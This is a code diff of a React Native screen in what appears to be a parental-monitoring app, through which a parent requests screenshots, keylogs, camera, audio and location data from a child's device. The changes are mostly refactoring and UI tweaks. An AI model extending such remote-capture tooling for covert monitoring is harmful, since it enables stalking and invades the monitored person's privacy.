@@ -5,8 +5,13 @@ import { View, FlatList, StyleSheet } from "react-native-web";
 import { FontAwesome, MaterialIcons } from "@expo/vector-icons";
 import base64 from "react-native-base64";
 import ParentMenu from "../components/ParentMenu";
-import { handleRefresh, removeNonAscii } from "../config/Utils"
-import { addRequest, getSpecificData, deleteData } from "../config/FetchRequest";
+import { handleRefresh, removeNonAscii } from "../config/Utils";
+import {
+  addRequest,
+  getSpecificData,
+  deleteData,
+} from "../components/FetchRequest";
+import { GoBackButton } from "../components/Buttons";
 import global from "../config/global";
 import colors from "../config/colors";
 import sizes from "../config/sizes";
@@ -14,7 +19,6 @@ import sizes from "../config/sizes";
 // Screenshot, Keylog, Camera, Audio and Location requests page
 
 const ImmediatelyRequest = ({ route, navigation }) => {
-
   const [data, setData] = useState([]);
   const [specificData, setSpecificData] = useState([]);
   const [refresh, setRefresh] = useState(true);
@@ -38,7 +42,6 @@ const ImmediatelyRequest = ({ route, navigation }) => {
       });
     setRefresh(false);
   }, [refresh]); //, pageCurrent]);
-
 
   const setComponentType = () => {
     switch (type) {
@@ -97,7 +100,7 @@ const ImmediatelyRequest = ({ route, navigation }) => {
         let dataAttr = { REQUEST_TYPE: type };
         return (
           <Pressable
-            onPress={() =>  addRequest(uid, dataAttr)}
+            onPress={() => addRequest(uid, dataAttr)}
             style={styles.AddRequestButton}
           >
             <Text style={global.ButtonText}>
@@ -113,6 +116,7 @@ const ImmediatelyRequest = ({ route, navigation }) => {
       <ParentMenu navigation={navigation} />
       <View style={global.RightContainer}>
         <View>
+          <GoBackButton navigation={navigation} uid={uid} name={name} />
           <Pressable
             style={global.RefreshButton}
             onPress={() => handleRefresh(setRefresh)}
@@ -162,7 +166,8 @@ const ImmediatelyRequest = ({ route, navigation }) => {
               <Pressable
                 style={global.ButtonList}
                 onPress={() => {
-                  setModalVisible(true), getSpecificData(uid, item.dataId, setSpecificData);
+                  setModalVisible(true),
+                    getSpecificData(uid, item.dataId, setSpecificData);
                 }}
               >
                 <Text style={global.ListItemText}>
@@ -194,7 +199,9 @@ const ImmediatelyRequest = ({ route, navigation }) => {
                 <View style={global.BottomModalView}>
                   <Pressable
                     style={global.CloseButton}
-                    onPress={() => setModalVisible(!modalVisible)}
+                    onPress={() => {
+                      setModalVisible(!modalVisible), snd.load();
+                    }}
                   >
                     <Text style={global.ButtonText}>Close</Text>
                   </Pressable>
